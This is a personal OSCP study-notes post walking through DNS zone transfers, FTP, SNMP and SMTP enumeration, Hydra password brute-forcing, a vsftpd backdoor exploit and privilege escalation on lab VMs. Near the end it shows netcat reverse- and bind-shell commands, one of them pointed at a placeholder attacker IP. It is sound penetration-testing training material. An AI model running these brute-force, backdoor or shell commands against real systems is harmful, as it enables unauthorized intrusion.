---
title: OSCP Study Notes - 2021/03/10
date: 2021-03-10 00:48:18
tags: [OSCP, Study Notes, Penetration Testing]
---
# TRY HARDER!!

## DNS Enumeration
### host command
```
└─# host -t ns zonetransfer.me
zonetransfer.me name server nsztm2.digi.ninja.
zonetransfer.me name server nsztm1.digi.ninja.

```
-t specifies the query type
```
└─# host -t mx zonetransfer.me                                                                                 1 ⨯
zonetransfer.me mail is handled by 10 ALT2.ASPMX.L.GOOGLE.COM.
zonetransfer.me mail is handled by 20 ASPMX2.GOOGLEMAIL.COM.
zonetransfer.me mail is handled by 0 ASPMX.L.GOOGLE.COM.
zonetransfer.me mail is handled by 20 ASPMX5.GOOGLEMAIL.COM.
zonetransfer.me mail is handled by 20 ASPMX4.GOOGLEMAIL.COM.
zonetransfer.me mail is handled by 20 ASPMX3.GOOGLEMAIL.COM.
zonetransfer.me mail is handled by 10 ALT1.ASPMX.L.GOOGLE.COM.
```

### zonetransfer
```
└─# host -l zonetransfer.me nsztm1.digi.ninja                                                                  1 ⨯
Using domain server:
Name: nsztm1.digi.ninja
Address: 81.4.108.41#53
Aliases: 

zonetransfer.me has address 5.196.105.14
zonetransfer.me name server nsztm1.digi.ninja.
zonetransfer.me name server nsztm2.digi.ninja.
14.105.196.5.IN-ADDR.ARPA.zonetransfer.me domain name pointer www.zonetransfer.me.
asfdbbox.zonetransfer.me has address 127.0.0.1
canberra-office.zonetransfer.me has address 202.14.81.230
dc-office.zonetransfer.me has address 143.228.181.132
deadbeef.zonetransfer.me has IPv6 address dead:beaf::
email.zonetransfer.me has address 74.125.206.26
home.zonetransfer.me has address 127.0.0.1
internal.zonetransfer.me name server intns1.zonetransfer.me.
internal.zonetransfer.me name server intns2.zonetransfer.me.
intns1.zonetransfer.me has address 81.4.108.41
intns2.zonetransfer.me has address 167.88.42.94
office.zonetransfer.me has address 4.23.39.254
ipv6actnow.org.zonetransfer.me has IPv6 address 2001:67c:2e8:11::c100:1332
owa.zonetransfer.me has address 207.46.197.32
alltcpportsopen.firewall.test.zonetransfer.me has address 127.0.0.1
vpn.zonetransfer.me has address 174.36.59.154
www.zonetransfer.me has address 5.196.105.14
```
-l     List zone: The host command performs a zone transfer of zone name and prints out the NS,  PTR  and address records (A/AAAA).  

AXFR offers no authentication, so any client can ask a DNS server for a copy of the entire zone. This means that unless some kind of protection is introduced, an attacker can get a list of all hosts for a domain, which gives them a lot of potential attack vectors.

## dnsrecon - DNS Enumeration and Scanning Tool
```
dnsrecon -d zonetransfer.me -t axfr
```
-d domain
-t type

## dnsenum
multithread script to enumerate information on a domain and to discover non-contiguous IP blocks  
```
dnsenum zonetransfer.me
```

# Other Enumeration
Find some Vulnhub box and do some scan
## FTP
Default Port: 21  
Using Metasploitable
```
nmap -nmap -Pn -sS -A -p 21 192.168.119.129 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-10 14:18 EST
Nmap scan report for 192.168.119.129
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.119.132
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
MAC Address: 00:0C:29:7F:42:67 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Unix
```
-sC: equivalent to --script=default 
connect to it and get banner 
```
ftp 192.168.119.129                                                                                      130 ⨯
Connected to 192.168.119.129.
220 (vsFTPd 2.3.4)
```

Use Metasplit:  
```
msf6 auxiliary(scanner/ftp/ftp_version) > set RHOST 192.168.119.129
RHOST => 192.168.119.129
msf6 auxiliary(scanner/ftp/ftp_version) > exploit

[+] 192.168.119.129:21    - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
[*] 192.168.119.129:21    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ftp/ftp_version) > 
```

```
msf6 auxiliary(scanner/ftp/ftp_login) > set blank_passwords true
blank_passwords => true
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.119.129
RHOSTS => 192.168.119.129
msf6 auxiliary(scanner/ftp/ftp_login) > set USERNAME anonyus
USERNAME => anonyus
msf6 auxiliary(scanner/ftp/ftp_login) > set username anonymous
username => anonymous
msf6 auxiliary(scanner/ftp/ftp_login) > exploit

[*] 192.168.119.129:21    - 192.168.119.129:21 - Starting FTP login sweep
[!] 192.168.119.129:21    - No active DB -- Credential data will not be saved!
[+] 192.168.119.129:21    - 192.168.119.129:21 - Login Successful: anonymous:
[*] 192.168.119.129:21    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### Use Hydra
hydra - a very fast network logon cracker which supports many different services  
```
hydra -s 21 -C ftp-default-userpass.txt -u -f 192.168.119.129 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-10 15:03:19
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries, ~1 try per task
[DATA] attacking ftp://192.168.119.129:21/
[21][ftp] host: 192.168.119.129   login: ftp   password: ftp
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-10 15:03:20
```
-u        loop around users, not passwords (effective! implied with -x)  
-C FILE   colon separated "login:pass" format, instead of -L/-P options  
-f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)  
-s port 
### Metasploit
searchsploit vfstpd 2.3.4 there's a metasploit module
```
use unix/ftp/vsftpd_234_backdoor
```
can get the shell

## SNMP
**Vulnhub:** analoguepond  
reference walkthrough: http://xhyumiracle.com/vulnhub-analoguepond-walkthrough-part-1/


Simple Network Management Protocol (SNMP) is an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. Devices that typically support SNMP include cable modems, routers, switches, servers, workstations, printers, and more.

UDP port 161

* SNMP enumeration is a process of enumerating user accounts and devices on a target system using SNMP.
* SNMP consists of a manager and an agent; agents are embedded on every network device, and the manager is installed on a separate computer.

```
sudo nmap -sU -p1-200 192.168.119.133
```
snmp-brute
```
sudo nmap -sU -p161 --script snmp-brute 192.168.119.133 

PORT    STATE         SERVICE
161/udp open|filtered snmp
| snmp-brute: 
|_  public - Valid credentials
MAC Address: 00:0C:29:EA:20:95 (VMware)
```
### onesixtyone
SNMP Scanner  
```
└─$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.119.133                                         1 ⨯
Scanning 1 hosts, 51 communities
192.168.119.133 [public] Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
```
-c \<communityfile\> file with community names to try  
-d debug  

### snmp-check
```
└─$ snmp-check 192.168.119.133
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.119.133:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.119.133
  Hostname                      : analoguepond
  Description                   : Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64
  Contact                       : Eric Burdon <eric@example.com>
  Location                      : There is a house in New Orleans they call it...
  Uptime snmp                   : 00:38:18.10
  Uptime system                 : 00:38:07.70
  System date                   : 2021-3-11 03:01:11.0
```
snmp-check - SNMP device enumerator

Find string `public`

### snmpwalk
retrieve a subtree of management values using SNMP GETNEXT requests
```
└─$ snmpwalk -v 2c -c public 192.168.119.133
iso.3.6.1.2.1.1.1.0 = STRING: "Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (259734) 0:43:17.34
iso.3.6.1.2.1.1.4.0 = STRING: "Eric Burdon <eric@example.com>"
iso.3.6.1.2.1.1.5.0 = STRING: "analoguepond"
iso.3.6.1.2.1.1.6.0 = STRING: "There is a house in New Orleans they call it..."
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (260776) 0:43:27.76
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E5 03 0B 03 06 14 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-3.19.0-25-generic root=/dev/mapper/analoguepond--vg-root ro
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 25
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```
-v 1|2c|3             specifies SNMP version to use  
-c COMMUNITY          set the community string  
`eric` could be the user name  
`There is a house in New Orleans they call it..`, google it, its a lyric:
```
There is a house in New Orleans
They call the Rising Sun,
```
suppose it's the password, try it:
```
therisingsun
risingsun
rising sun
the rising sun
houseoftherisingsun
house of the rising sun
```
Use John to generate password candidates
```
john - a tool to find weak passwords of your users
john --wordlist=passlist --rules --stdout > passcandi
```
--rules[=SECTION[,..]]     enable word mangling rules  
--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]  
output candidates to file  

then use hydra to crack
```
└─$ hydra -P passcandi -l eric 192.168.119.133 ssh                                                           255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-10 22:24:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 156 login tries (l:1/p:156), ~10 tries per task
[DATA] attacking ssh://192.168.119.133:22/
[22][ssh] host: 192.168.119.133   login: eric   password: therisingsun
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-10 22:24:51
```
-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE  
-p PASS  or -P FILE  try password PASS, or load several passwords from FILE  

find password: `therisingsun`
```
ssh eric@192.168.119.133
eric@analoguepond:~$ sudo -v
sudo: unable to resolve host analoguepond
Sorry, user eric may not run sudo on analoguepond.
```
not a sudo user
```
eric@analoguepond:~$ uname -a
Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux

searchsploit ubuntu 14.04
found:
'overlayfs' Local Privilege Escalation 
```
https://www.exploit-db.com/exploits/39166  

get the root access  
```
root@analoguepond:~# cd /root/
root@analoguepond:/root# ls
flag.txt
root@analoguepond:/root# cat flag.txt 
C'Mon Man! Y'all didn't think this was the final flag so soon...?

Did the bright lights and big city knock you out...? If you pull
a stunt like this again, I'll send you back to Walker...

This is obviously troll flah #1 So keep going.

root@analoguepond:/root# netstat -nplt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1231/dnsmasq    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      918/sshd        
tcp6       0      0 :::22                   :::*                    LISTEN      918/sshd    

netstat  -  Print network connections, routing tables, interface
       statistics, masquerade connections, and multicast memberships
```
-n, --numeric            don't resolve names  
-p, --programs           display PID/Program name for sockets  
-l, --listening          display listening server sockets  
{-t|--tcp} {-u|--udp} {-w|--raw} {-x|--unix}   


```
ifconfig
virbr0    Link encap:Ethernet  HWaddr 52:54:00:b2:23:25  
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0

```
could use the pingsweep.sh script on victim machine  
 
there's something else, but lets end here, since my aim is to learn snmp...  


## SMTP

```
telnet 192.169.119.129 25
220 metasploitable.localdomain ESMTP Postfix (Ubuntu)

rfy admin@metasploitable.localdomain
550 5.1.1 <admin@metasploitable.localdomain>: Recipient address rejected: User unknown in local recipient table
vrfy msfadmin@metasploitable.localdomain
252 2.0.0 msfadmin@metasploitable.localdomain
```
check if user exist

### Metasploit:
```
use scanner/smtp/smtp_enum

Description:
  The SMTP service has two internal commands that allow the 
  enumeration of users: VRFY (confirming the names of valid users) and 
  EXPN (which reveals the actual address of users aliases and lists of 
  e-mail (mailing lists)). Through the implementation of these SMTP 
  commands can reveal a list of valid users.

[+] 192.168.119.129:25    - 192.168.119.129:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys,
```

### Use smtp-user-enum
```
└─$ /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.119.129
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/wordlists/metasploit/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Wed Mar 10 21:16:31 2021 #########
192.168.119.129: backup exists
192.168.119.129: bin exists
192.168.119.129: daemon exists
192.168.119.129: distccd exists
192.168.119.129: ftp exists
192.168.119.129: games exists
192.168.119.129: gnats exists
192.168.119.129: irc exists
192.168.119.129: libuuid exists
192.168.119.129: list exists
192.168.119.129: lp exists
192.168.119.129: mail exists
192.168.119.129: man exists
192.168.119.129: mysql exists
192.168.119.129: news exists
192.168.119.129: nobody exists
192.168.119.129: postfix exists
192.168.119.129: postgres exists
192.168.119.129: postmaster exists
192.168.119.129: proxy exists
192.168.119.129: root exists
192.168.119.129: ROOT exists
192.168.119.129: service exists
192.168.119.129: sshd exists
192.168.119.129: sync exists
192.168.119.129: sys exists
192.168.119.129: syslog exists
192.168.119.129: user exists
192.168.119.129: uucp exists
192.168.119.129: www-data exists
######## Scan completed at Wed Mar 10 21:16:32 2021 #########
30 results.

168 queries in 1 seconds (168.0 queries / sec)
```
add -D metasploitable.localdomain to guess valid email address instead of user name
```
192.168.119.129: mysql@metasploitable.localdomain exists
192.168.119.129: news@metasploitable.localdomain exists
192.168.119.129: nobody@metasploitable.localdomain exists
192.168.119.129: postfix@metasploitable.localdomain exists
```


# Netcat
```
nc -nv 192.168.0.22 80
```
-n           numeric-only IP addresses, no DNS  
-v           verbose [use twice to be more verbose]  

if victim execute this, it will connect to attacker's listening nc, and provide shell to him
```
nc -nv attackerIP port -e /bin/bash
```

## Listening
Victim listening on port, whoever connect to it will gain the shell
```
nc -nvlp 4444 -e /usr/bin/bash
```
-l listening  
-p port   
-e filename             program to exec after connect \[dangerous!!]  


